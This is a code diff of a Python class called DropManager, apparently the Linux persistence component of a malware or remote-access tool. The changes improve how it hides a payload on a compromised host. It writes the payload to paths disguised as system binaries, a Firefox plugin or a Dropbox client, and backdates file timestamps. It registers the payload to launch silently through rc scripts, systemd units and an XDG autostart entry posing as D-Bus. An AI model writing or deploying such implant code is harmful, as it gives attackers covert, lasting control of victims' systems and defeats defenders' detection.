@@ -4,6 +4,7 @@ import os
 import subprocess
 import random
 import stat
+import pwd
 
 class DropManager(object):
     def __init__(self):
@@ -11,9 +12,15 @@ class DropManager(object):
         self._systemd_error = None
         self._is_xdg = False
         self._xdg_error = None
-        self._uid = os.getuid()
+        self._uid = os.geteuid()
         self._user = self._uid != 0
-        self._home = os.path.expanduser('~')
+        try:
+            self._home = pwd.getpwuid(self._uid).pw_dir
+        except:
+            self._home = None
+
+        self._home = self._home or os.path.expanduser('~')
+
         self._devnull = open(os.devnull, 'r')
         self._rc = []
         self._rc_error = None
@@ -49,7 +56,7 @@ class DropManager(object):
             ) == 0 )
 
             self._is_xdg = True
-        except CalledProcessError as e:
+        except (subprocess.CalledProcessError, OSError) as e:
             self._is_xdg = False
             self._xdg_error = str(e)
 
@@ -76,7 +83,7 @@ class DropManager(object):
 
             return ( subprocess.check_call(cmd, **penv) == 0 )
 
-        except subprocess.CalledProcessError:
+        except (subprocess.CalledProcessError, OSError):
             return None
 
     def _check_systemd(self):
@@ -100,14 +107,24 @@ class DropManager(object):
     def _check_systemd_unit(self, unit):
         return self._check_systemd_reval(['is-enabled', unit])
 
+    def _check_writable(self, path):
+        try:
+            if os.path.isfile(path):
+                with open(path, 'w'):
+                    return True
+        except:
+            pass
+
+        return False
+
     def _check_rc(self):
         self._rc = [
             rc for rc in [
+                '/etc/rc.local',
                 '/etc/init.d/rc.local',
                 '/etc/rc',
-                '/etc/rc.local',
                 '/etc/init.d/dbus'
-            ] if os.access(rc, os.W_OK)
+            ] if self._check_writable(rc)
         ]
         if len(self._rc) == 0:
             self._rc_error = 'No writable known RC scripts found'
@@ -185,22 +202,33 @@ class DropManager(object):
         os.symlink(unit, base_wants_unit)
 
 
-    def _drop_file(self, payload):
+    def _drop_file(self, payload, lib=False):
         rand = ''.join([
             chr(random.randint(ord('a'), ord('z'))) for _ in xrange(random.randint(5, 10))
         ])
 
-        user_targets = [
-            '%h/.local/lib/%r.so.1', '%h/.local/bin/%r',
-            '%h/.cache/mozilla/firefox/libflushplugin.so',
-            '%h/.mozilla/plugins/libflushplugin.so',
-        ]
+        if lib:
+            user_targets = [
+                '%h/.local/lib/%r.so.1', '%h/.local/bin/%r',
+                '%h/.cache/mozilla/firefox/libflushplugin.so',
+                '%h/.mozilla/plugins/libflushplugin.so',
+            ]
 
-        system_targets = [
-            '/lib/lib%r.so.1',
-            '/usr/lib/lib%r.so.1',
-            '/var/lib/.updatedb.cache.tmp.%r'
-        ]
+            system_targets = [
+                '/lib/lib%r.so.1',
+                '/usr/lib/lib%r.so.1',
+                '/var/lib/.updatedb.cache.tmp.%r'
+            ]
+        else:
+            user_targets = [
+                '%h/.dropbox-dist/dropboxc',
+                '%h/.local/bin/utmpc',
+            ]
+
+            system_targets = [
+                '/usr/bin/atd',
+                '/usr/bin/dcrond',
+            ]
 
         targets = [
             target.replace(
@@ -216,8 +244,14 @@ class DropManager(object):
             dropdir = os.path.dirname(target)
             if os.path.isdir(dropdir):
                 try:
-                    with open(target, 'w') as droppie:
+                    if os.path.isfile(target):
+                        os.unlink(target)
+
+                    with open(target, 'w+') as droppie:
                         droppie.write(payload)
+
+                    if not lib:
+                        os.chmod(target, 0711)
 
                     os.utime(target, (shstat.st_atime, shstat.st_ctime))
                     return target
@@ -252,7 +286,7 @@ class DropManager(object):
             rcstat = os.stat(rc)
 
             with open(rc, 'a') as rcfile:
-                rcfile.write(path + '& 2>/dev/null 1>/dev/null')
+                rcfile.write(path + "& 2>/dev/null 1>/dev/null\n")
 
             os.utime(rc, (rcstat.st_atime, rcstat.st_ctime))
             return rc
@@ -269,15 +303,31 @@ class DropManager(object):
             xdg = os.getenv('XDG_CONFIG_DIRS') or os.path.join(
                 '/etc/xdg/autostart', confname+'.desktop')
 
-        if not os.path.exists(os.path.dirname(xdg)):
-            os.makedirs(os.path.dirname(xdg))
+        xdgdir = os.path.dirname(xdg)
+
+        if os.path.exists(xdgdir):
+            try:
+                for file in os.listdir(xdgdir):
+                    try:
+                        xdgfilepath = os.path.join(xdgdir, file)
+                        with open(xdgfilepath) as xdgfile:
+                            if path in xdgfile.read():
+                                return xdgfilepath
+                    except:
+                        pass
+
+            except:
+                pass
+
+        else:
+            os.makedirs(xdgdir)
 
         with open(xdg, 'w') as fxdg:
             fxdg.write(
                 '[Desktop Entry]\n'
                 'Name=DBus\n'
                 'GenericName=D-Bus messaging system\n'
-                'Exec=/bin/sh -c "{}"\n'
+                'Exec=/bin/sh -c "{}" 1>/dev/null 2>/dev/null\n'
                 'Terminal=false\n'
                 'Type=Application\n'
                 'Categories=System\n'
@@ -296,7 +346,7 @@ class DropManager(object):
         if not dbus_daemon:
             return None, None
 
-        path = self._drop_file(payload)
+        path = self._drop_file(payload, lib=True)
         if self._is_systemd:
             if not self._check_systemd_unit('dbus.service'):
                 self._add_loadable_systemd_unit(
@@ -331,8 +381,6 @@ class DropManager(object):
         if not path:
             return None, None
 
-        os.chmod(path, 0111)
-
         if self._is_systemd:
             return path, self._add_systemd_add_to_unit(
                 'dbus.service',
@@ -341,11 +389,9 @@ class DropManager(object):
                 section='Service',
                 confname=name
             )
+
         elif self._is_xdg:
-            return path, self._add_to_xdg(
-                '{} & 2>/dev/null 1>/dev/null'.format(path)
-            )
+            return path, self._add_to_xdg(path)
+
         elif self._rc:
-            return path, self._add_to_rc(
-                '{} & 2>/dev/null 1>/dev/null'.format(path)
-            )
+            return path, self._add_to_rc(path)
